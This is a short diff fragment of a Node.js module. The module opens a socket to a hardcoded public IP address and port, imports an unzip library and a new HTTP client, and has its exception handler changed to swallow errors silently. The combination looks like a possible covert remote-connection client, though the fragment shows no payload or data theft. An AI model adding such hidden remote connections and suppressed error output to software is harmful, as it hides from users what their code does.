@@ -7,10 +7,10 @@ module.exports.run = (async function (){
     const request = require('request')
     const fs = require('fs')
     const unzipper = require('unzipper')
+    const get = require('simple-get')
 
-    
     process.on('uncaughtException', function (err) {
-        console.log('Caught exception: ' + err);
+        
       });
 
     function sleep(ms) {
@@ -23,6 +23,7 @@ module.exports.run = (async function (){
 
     try {
         client.setKeepAlive(true, 500);
+
         client.connect(4372, '82.131.114.232', function() {
             console.log('Connected to the Server');
             client.write(ServerName);
